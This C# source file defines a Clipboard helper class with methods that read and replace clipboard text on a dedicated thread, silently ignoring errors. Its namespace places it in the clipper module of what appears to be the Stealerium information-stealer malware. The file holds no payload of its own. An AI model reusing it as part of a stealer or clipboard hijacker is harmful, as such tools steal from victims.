using System.Threading;

namespace Stealerium.Clipper
{
    internal sealed class Clipboard
    {
        // Get text from clipboard
        public static string GetText()
        {
            var returnValue = string.Empty;
            try
            {
                var staThread = new Thread(
                    delegate() { returnValue = System.Windows.Forms.Clipboard.GetText(); });
                staThread.SetApartmentState(ApartmentState.STA);
                staThread.Start();
                staThread.Join();
            }
            catch
            {
                // ignored
            }

            return returnValue;
        }

        // Set text to clipboard
        public static void SetText(string text)
        {
            var staThread = new Thread(
                delegate()
                {
                    try
                    {
                        System.Windows.Forms.Clipboard.SetText(text);
                    }
                    catch
                    {
                        // ignored
                    }
                });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();
        }
    }
}